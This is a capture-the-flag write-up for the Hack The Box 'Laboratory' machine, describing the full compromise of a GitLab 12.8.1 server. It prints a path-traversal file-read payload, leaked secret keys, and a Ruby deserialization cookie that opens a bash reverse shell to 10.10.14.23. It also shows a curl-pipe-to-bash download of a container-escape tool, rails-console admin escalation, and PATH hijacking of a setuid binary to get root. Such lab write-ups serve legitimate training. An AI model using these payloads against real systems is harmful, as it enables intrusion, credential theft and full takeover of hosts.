@@ -1,0 +1,420 @@
+Laboratory - Hack The Box - Linux Easy Gitlab
+
+2 Exploits for Gitlab, Deserialization attack and LFI payload.
+
+We change the hosts file to add laboratory.htb to ip 10.10.10.216, we don't find much except.
+
+Throught the nmap scans we find the dns name git.laboratory.htb
+
+There is a git lab website where we can a create user. We use the domain name as part of our email to create the user.
+
+We go to gitlab help to look at the version since not much else is found, and we look up the versions release note
+Commands and Output:
+====================================================================================================================================
+GitLab Community Edition 12.8.1
+====================================================================================================================================
+
+https://hackerone.com/reports/827052
+Arbitrary files can be copied, we have to create 2 projects to create an LFI that can be abused when moving and issuing.
+
+Once we have created the account we can now create two separate projects "test1" and "test2" this will help us take advanatage of
+a vulnerability that allows to read and download files from the hosting gitlab system. It takes advanatge of follwoing regular 
+expression which has no restrictions o what files can be copied, path traversal can be used to copy any file in the system.
+Commands and Output:
+====================================================================================================================================
+  MARKDOWN_PATTERN = %r{\!?\[.*?\]\(/uploads/(?<secret>[0-9a-f]{32})/(?<file>.*?)\)}.freeze
+====================================================================================================================================
+
+When we create an issue we can then use the following code in the notes area to create the file copy
+
+Commands and Output:
+====================================================================================================================================
+![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
+====================================================================================================================================
+
+All we need to now from within gitlab is to move the issue to a different project and we can then have the file copied and ready to
+be downloaded, in the example above we can download the "/etc/passwd" file.
+
+We can do the same of a yml file that contains a secret key from gitlab that can allow for remote code execution on the host
+the file in question is the following: /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
+
+So we create a new issue and replace /etc/passwd with secrets.yml and move the issue to another project which copies the yaml file
+over via unrestricted path traversal.
+
+Commands and Output:
+====================================================================================================================================
+![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)
+====================================================================================================================================
+
+We now have the key necessary to create the rce necessary for the exploit to work.
+Commands and Output:
+====================================================================================================================================
+production:
+  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838
+  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
+  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0b84263903fd06af
+====================================================================================================================================
+
+We now need to create a gitlab instance from which we can replicate the same calls that the victim host does, we will use docker 
+to bring up an instance of gitlab that we can use for the exploit.
+
+Commands and Output:
+====================================================================================================================================
+sudo apt install docker.io
+
+
+┌─[user@parrot-virtual]─[~]
+└──╼ $docker image ls
+REPOSITORY         TAG           IMAGE ID       CREATED         SIZE
+hello-world        latest        d1165f221234   6 weeks ago     13.3kB
+gitlab/gitlab-ce   12.8.1-ce.0   719e7e45b1e2   13 months ago   1.89GB
+┌─[user@parrot-virtual]─[~]
+└──╼ $docker run 719e7e45b1e2
+Thank you for using GitLab Docker Image!
+Current version: gitlab-ce=12.8.1-ce.0
+
+Configure GitLab for your system by editing /etc/gitlab/gitlab.rb file
+And restart this container to reload settings.
+To do it use docker exec:
+
+  docker exec -it gitlab vim /etc/gitlab/gitlab.rb
+  docker restart gitlab
+
+====================================================================================================================================
+
+AND it takes a really long time to bring up. What we end up doing is copying the secret key_base value unto the system and overwriting
+the value that is in our own test system which will then allow us to generate a payload from which we can send via curl and get a 
+reverse shell.
+
+Commands and Output:
+====================================================================================================================================
+request = ActionDispatch::Request.new(Rails.application.env_config)
+request.env["action_dispatch.cookies_serializer"] = :marshal
+cookies = request.cookie_jar
+
+erb = ERB.new("<%= bash -c 'bash -i >& /dev/tcp/10.10.14.23/9001 0>&1' %>")
+depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
+cookies.signed[:cookie] = depr
+puts cookies[:cookie]
+====================================================================================================================================
+
+Once the secrets yml has been modified, we can restart our docker instance. And then start rails console and use the runy code
+to construct the seralized payload to be used that has the reverse shell attached and ready to go.
+
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~]
+└──╼ $docker ps
+CONTAINER ID   IMAGE          COMMAND             CREATED          STATUS                    PORTS                     NAMES
+0f4daffed1e0   719e7e45b1e2   "/assets/wrapper"   49 minutes ago   Up 49 minutes (healthy)   22/tcp, 80/tcp, 443/tcp   amazing_neumann
+┌─[user@parrot-virtual]─[~]
+└──╼ $docker image ls
+REPOSITORY         TAG           IMAGE ID       CREATED         SIZE
+hello-world        latest        d1165f221234   6 weeks ago     13.3kB
+gitlab/gitlab-ce   12.8.1-ce.0   719e7e45b1e2   13 months ago   1.89GB
+┌─[✗]─[user@parrot-virtual]─[~]
+└──╼ $docker exec -it 0f4daffed1e0 bash
+root@0f4daffed1e0:/# ls
+RELEASE  assets  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
+root@0f4daffed1e0:/# vim /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
+root@0f4daffed1e0:/# gitlab-ctl restart
+ok: run: alertmanager: (pid 6807) 1s
+ok: run: gitaly: (pid 6827) 0s
+ok: run: gitlab-exporter: (pid 6836) 0s
+ok: run: gitlab-workhorse: (pid 6855) 1s
+ok: run: grafana: (pid 6878) 0s
+ok: run: logrotate: (pid 6897) 1s
+ok: run: nginx: (pid 6903) 0s
+ok: run: postgres-exporter: (pid 6989) 1s
+ok: run: postgresql: (pid 7001) 0s
+ok: run: prometheus: (pid 7010) 0s
+ok: run: redis: (pid 7026) 0s
+ok: run: redis-exporter: (pid 7031) 0s
+ok: run: sidekiq: (pid 7042) 0s
+ok: run: sshd: (pid 7048) 1s
+ok: run: unicorn: (pid 7055) 0s
+====================================================================================================================================
+
+Commands and Output:$
+====================================================================================================================================$
+request = ActionDispatch::Request.new(Rails.application.env_config)
+request.env["action_dispatch.cookies_serializer"] = :marshal
+cookies = request.cookie_jar
+erb = ERB.new("<%= `bash -c 'bash -i >& /dev/tcp/10.10.14.23/9001 0>&1'` %>")
+depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
+cookies.signed[:cookie] = depr
+puts cookies[:cookie]
+====================================================================================================================================$
+
+Commands and Output:
+====================================================================================================================================
+....
+....
+irb(main):006:0> cookies.signed[:cookie] = depr
+DEPRECATION WARNING: @result is deprecated! Call result.is_a? instead of @result.is_a?. Args: [Hash] (called from irb_binding at (irb):6)
+bash: connect: Connection refused
+bash: /dev/tcp/10.10.14.23/9001: Connection refused
+bash: connect: Connection refused
+bash: /dev/tcp/10.10.14.23/9001: Connection refused
+=> ""
+irb(main):007:0> puts cookies[:cookie]
+BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidSNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjIzLzkwMDEgMD4mMSdgICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--35132b9141933f8db9bf4545c83453178fbeaca1
+=> nil
+irb(main):008:0>
+
+....
+
+====================================================================================================================================
+
+We the finally use the following curl command against the server using the "-k" option since it is using https
+
+Commands and Output: "bash -c 'bash -i >& /dev/tcp/10.10.14.23/9001 0>&1'"
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/laboratory]
+└──╼ $curl -vvv -k 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidSNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjIzLzkwMDEgMD4mMSdgICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--35132b9141933f8db9bf4545c83453178fbeaca1"
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/laboratory]
+└──╼ $nc -lnvp 9001
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.10.216.
+Ncat: Connection from 10.10.10.216:51588.
+bash: cannot set terminal process group (392): Inappropriate ioctl for device
+bash: no job control in this shell
+git@git:~/gitlab-rails/working$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+git@git:/$ ls -la
+total 88
+drwxr-xr-x   1 root root 4096 Jul  2  2020 .
+drwxr-xr-x   1 root root 4096 Jul  2  2020 ..
+-rwxr-xr-x   1 root root    0 Jul  2  2020 .dockerenv
+-rw-r--r--   1 root root  157 Feb 24  2020 RELEASE
+drwxr-xr-x   2 root root 4096 Feb 24  2020 assets
+drwxr-xr-x   1 root root 4096 Feb 24  2020 bin
+drwxr-xr-x   2 root root 4096 Apr 12  2016 boot
+drwxr-xr-x   5 root root  340 Apr 18 03:15 dev
+drwxr-xr-x   1 root root 4096 Jul  2  2020 etc
+drwxr-xr-x   2 root root 4096 Apr 12  2016 home
+drwxr-xr-x   1 root root 4096 Sep 13  2015 lib
+drwxr-xr-x   2 root root 4096 Feb 12  2020 lib64
+drwxr-xr-x   2 root root 4096 Feb 12  2020 media
+drwxr-xr-x   2 root root 4096 Feb 12  2020 mnt
+drwxr-xr-x   1 root root 4096 Feb 24  2020 opt
+dr-xr-xr-x 297 root root    0 Apr 18 03:15 proc
+drwx------   1 root root 4096 Jul 17  2020 root
+drwxr-xr-x   1 root root 4096 Apr 18 03:15 run
+drwxr-xr-x   1 root root 4096 Feb 21  2020 sbin
+drwxr-xr-x   2 root root 4096 Feb 12  2020 srv
+dr-xr-xr-x  13 root root    0 Apr 18 03:15 sys
+drwxrwxrwt   1 root root 4096 Apr 18 03:15 tmp
+drwxr-xr-x   1 root root 4096 Feb 12  2020 usr
+drwxr-xr-x   1 root root 4096 Feb 12  2020 var
+====================================================================================================================================
+
+We are indeed inside a docker environment, we must break out. We look for a tool on google called deep ce. "deepce docker"
+
+Commands and Output:
+====================================================================================================================================
+git@git:/$ curl http://10.10.14.23/deepce.sh | bash
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 34567  100 34567    0     0   120k      0 --:--:-- --:--:-- --:--:--  120k
+
+                      ##         .
+                ## ## ##        ==
+             ## ## ## ##       ===
+         /"""""""""""""""""\___/ ===
+    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~
+         \______ X           __/
+           \    \         __/
+            \____\_______/
+          __
+     ____/ /__  ___  ____  ________
+    / __  / _ \/ _ \/ __ \/ ___/ _ \   ENUMERATE
+   / /_/ /  __/  __/ /_/ / (__/  __/  ESCALATE
+   \__,_/\___/\___/ .___/\___/\___/  ESCAPE
+                 /_/
+
+ Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
+ by stealthcopter
+
+==========================================( Colors )==========================================
+[+] Exploit Test ............ Exploitable - Check this out
+[+] Basic Test .............. Positive Result
+[+] Another Test ............ Error running check
+[+] Negative Test ........... No
+[+] Multi line test ......... Yes
+Command output
+spanning multiple lines
+
+Tips will look like this and often contains links with additional info. You can usually 
+ctrl+click links in modern terminal to open in a browser window
+See https://stealthcopter.github.io/deepce
+
+===================================( Enumerating Platform )===================================
+[+] Inside Container ........ Yes
+[+] Container Platform ...... docker
+[+] Container tools ......... None
+[+] User .................... git
+[+] Groups .................. git
+[+] Docker Executable ....... Not Found
+[+] Docker Sock ............. Not Found
+[+] Docker Version .......... Version Unknown
+==================================( Enumerating Container )===================================
+[+] Container ID ............ git.laboratory.htb
+[+] Container Full ID ....... dd53b3f8e0735e533f500cd27f90c0e288d2fc881eda70342e59a3486d46a89c
+[+] Container Name .......... Could not get container name through reverse DNS
+[+] Container IP ............ 172.17.0.2 
+[+] DNS Server(s) ........... 8.8.8.8 8.8.4.4 
+[+] Host IP ................. 172.17.0.1
+[+] Operating System ........ GNU/Linux
+[+] Kernel .................. 5.4.0-42-generic
+[+] Arch .................... x86_64
+[+] CPU ..................... AMD EPYC 7401P 24-Core Processor
+[+] Useful tools installed .. Yes
+/opt/gitlab/embedded/bin/curl
+/usr/bin/wget
+/bin/hostname
+/opt/gitlab/embedded/bin/python3
+[+] SSHD Service ............ grep: write error: Broken pipe
+Yes (port Port 22)
+[+] Privileged Mode ......... Unknown
+====================================( Enumerating Mounts )====================================
+[+] Docker sock mounted ....... No
+[+] Other mounts .............. Yes
+/srv/gitlab/config /etc/gitlab rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
+/srv/gitlab/logs /var/log/gitlab rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
+/srv/gitlab/data /var/opt/gitlab rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
+[+] Possible host usernames ...  
+====================================( Interesting Files )=====================================
+[+] Interesting environment variables ... No
+[+] Any common entrypoint files ......... No
+[+] Interesting files in root ........... Yes
+/RELEASE
+[+] Passwords in common files ........... No
+[+] Home directories .................... No
+bash: line 786: /etc/shadow: Permission denied
+[+] Hashes in shadow file ............... No
+[+] Searching for app dirs .............. 
+==================================( Enumerating Containers )==================================
+By default containers can communicate with other containers on the same network and the 
+host machine, this can be used to enumerate further
+
+Could not ping sweep, requires nmap or ping to be executable
+====================================================================================================================================
+
+Can't really do much from the macine can't ping at all. Must look at gitlab-rails console and see if we can look ata cheatsheet to
+break out of environment. We follow the steps below to make ourselves admin to be able to access other prokjects not visible to
+regular users.
+
+Commands and Output:
+====================================================================================================================================
+gitlab-rails console
+irb(main):016:0> u = User.find_by_username('hacker')
+=> #<User id:6 @hacker>
+irb(main):011:0> u = User.find(6)
+=> #<User id:6 @hacker>
+irb(main):012:0> u.admin = true
+=> true
+irb(main):013:0> u.save!
+=> true
+irb(main):014:0> 
+====================================================================================================================================
+
+Once we give ourselves admin privileges via rails we can login again and notice we have access to the admin area inside the admin 
+area there a 2 projects both owned by Dexter poiting there is a private ssh from dexter. We can download it and save it.
+We can now use that to login.
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/laboratory/www]
+└──╼ $ssh -i id_rsa dexter@laboratory.htb
+The authenticity of host 'laboratory.htb (10.10.10.216)' can't be established.
+ECDSA key fingerprint is SHA256:XexmI3GbFIB7qyVRFDIYvKcLfMA9pcV9LeIgJO5KQaA.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'laboratory.htb,10.10.10.216' (ECDSA) to the list of known hosts.
+dexter@laboratory:~$ whoami
+dexter
+====================================================================================================================================
+
+Next step is to run linpeas, we notice an interesting file owned by Dexter and root which can allow us to do a bunch of chmods
+Commands and Output:
+====================================================================================================================================
+-rwsr-xr-x 1 root   dexter           17K Aug 28  2020 /usr/local/bin/docker-security
+-rwsr-xr-x 1 root   root            163K Jan 19 14:21 /usr/bin/sudo  --->  /sudo$
+====================================================================================================================================
+We run an ltrace to look at what system calls are being executed 
+Commands and Output:
+====================================================================================================================================
+dexter@laboratory:/dev/shm$ ltrace /usr/local/bin/docker-security
+setuid(0)                                                                            = -1
+setgid(0)                                                                            = -1
+system("chmod 700 /usr/bin/docker"chmod: changing permissions of '/usr/bin/docker': Operation not permitted
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                               = 256
+system("chmod 660 /var/run/docker.sock"chmod: changing permissions of '/var/run/docker.sock': Operation not permitted
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                               = 256
++++ exited (status 0) +++
+====================================================================================================================================
+
+We can take advantage of the fact that is setuid file by modifying our path to have one of the commands "chmod" execute to whatever
+we want we can change our active path by prepending to it and writing a script that could give us a root shell.
+
+Commands and Output:
+====================================================================================================================================
+dexter@laboratory:~$ export PATH=/home/dexter:$PATH
+dexter@laboratory:~$ echo $PATH
+/home/dexter:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
+dexter@laboratory:~$ /usr/bin/chmod 777 chmod 
+dexter@laboratory:~$ ls
+chmod  user.txt
+dexter@laboratory:~$ cat chmod
+#!/bin/bash
+bash
+====================================================================================================================================
+
+And like magic we can beome root
+
+Commands and Output:
+====================================================================================================================================
+dexter@laboratory:~$ /usr/local/bin/docker-security
+root@laboratory:~# whoami
+root
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
